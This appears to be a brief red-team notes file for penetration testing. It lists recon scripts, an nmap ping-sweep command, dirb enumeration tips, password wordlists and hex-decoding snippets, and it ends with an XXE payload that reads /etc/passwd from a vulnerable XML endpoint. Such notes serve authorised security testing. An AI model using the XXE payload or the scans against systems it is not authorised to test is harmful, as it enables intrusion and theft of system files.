# Red Team

* gethead.sh - gets HEAD from some webservesr.
* getrobots.sh - get ```robots.txt``` from webservers.
* hexstr.py - converts hex-encoded str back to ascii

# Nmap
### Very quick ping sweep
```sudo nmap -n -sn -PE -T5 $ipRange```

# Webapps

Don't forget to enumerate everything. Even the things you haven't thought of.

### dirb
* Check for cgi-bin/
* Search for different file extensions (is there a list of common file ext for brute forcing?)


# Wordlists
* [SecList - Really good wordlists](https://github.com/danielmiessler/SecLists)
* raft-large
* rockyou

# Python

### Dealing with hex encoded strings.

#### Convert hex to dec, 6c = 'l'
```dec = int("6c", 16)```

#### Print that in ascii
```print chr(dec)```

## XXE (XML External Entity)

Find some Rest/XML API endpoint of a webapp, using POST requests you can get it to RCE.
```xml
<?xml version="1.0"?>
<!DOCTYPE food [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

